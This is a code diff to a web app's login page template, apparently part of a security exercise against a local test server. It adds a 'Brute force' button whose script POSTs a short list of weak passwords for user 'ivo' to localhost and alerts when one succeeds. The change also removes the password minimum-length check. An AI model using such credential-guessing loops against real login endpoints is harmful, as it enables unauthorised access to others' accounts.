@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -8,30 +9,71 @@
     <link rel='stylesheet' href='/stylesheets/style.css' />
     <title>Log in</title>
 </head>
+
 <body>
     <div class="card">
         <div class="card-body">
             <h1>Log in</h1><br>
-            <form action="./login" method="post">
-                Username: <input type="text" minlength="2" name="username"><br>
-                Password: <input type="password" name="password" minlength="8"> <br>
+            <form action="./login" method="post" id="loginform">
+                Username: <input type="text" minlength="2" name="username" id="username"><br>
+                Password: <input type="password" name="password" id="password"> <br>
                 <br>
-                <input type="submit" value="Log in" class="btn btn-success" />
-                <input type="reset" value="Reset" class="btn btn-danger">
+                <input type="submit" value="Log in" class="btn btn-success" id="login" />
+                <input type="reset" value="Reset" class="btn btn-secondary">
+                <button type="button" class="btn btn-danger" onclick="CreateBrute()">Brute force</button>
             </form>
             <% if (err !==undefined ) { %>
                 <p style="justify-content: center; background-color: red;">
                     <%= err %>
                 </p>
                 <% } %>
-            <br>
-            <div>Don't have account? Create one!</div>
-            <form action="./signup">
-                </br><input type="submit" value="Sign up" class="btn btn-success" />
-            </form>
-            <br>
-            <a class="btn btn-info" href="./" role="button">Return home</a>
+                    <br>
+                    <div>Don't have account? Create one!</div>
+                    <form action="./signup">
+                        </br><input type="submit" value="Sign up" class="btn btn-success" />
+                    </form>
+                    <br>
+                    <a class="btn btn-info" href="./" role="button">Return home</a>
         </div>
     </div>
+    <script>
+        async function CreateBrute() {
+            passwords = ["11111111", "22222222", "33333333", "44444444", "55555555", "66666666", "77777777", "88888888", "99999999", "87654321", "12345678"]
+            // for(let i = 0; i < passwords.length; i++){
+            //     document.getElementById('username').value = "ivo";
+            //     document.getElementById('password').value = passwords[i];
+            //     document.getElementById('loginform').submit();
+            // }
+
+            for (let i = 0; i < passwords.length; i++) {
+                await fetch("http://localhost:3000/login", {
+                    "headers": {
+                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+                        "accept-language": "en-US,en;q=0.9",
+                        "cache-control": "max-age=0",
+                        "content-type": "application/x-www-form-urlencoded",
+                        "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"",
+                        "sec-ch-ua-mobile": "?0",
+                        "sec-ch-ua-platform": "\"Windows\"",
+                        "sec-fetch-dest": "document",
+                        "sec-fetch-mode": "navigate",
+                        "sec-fetch-site": "same-origin",
+                        "sec-fetch-user": "?1",
+                        "upgrade-insecure-requests": "1"
+                    },
+                    "referrer": "http://localhost:3000/login",
+                    "referrerPolicy": "strict-origin-when-cross-origin",
+                    "body": "username=ivo&password=" + passwords[i],
+                    "method": "POST",
+                    "mode": "cors",
+                    "credentials": "include"
+                }).then((res) => {
+                    if (res.redirected)
+                        alert("Točna lozinka je: " + passwords[i]);
+                });
+            }
+        }
+    </script>
 </body>
+
 </html>
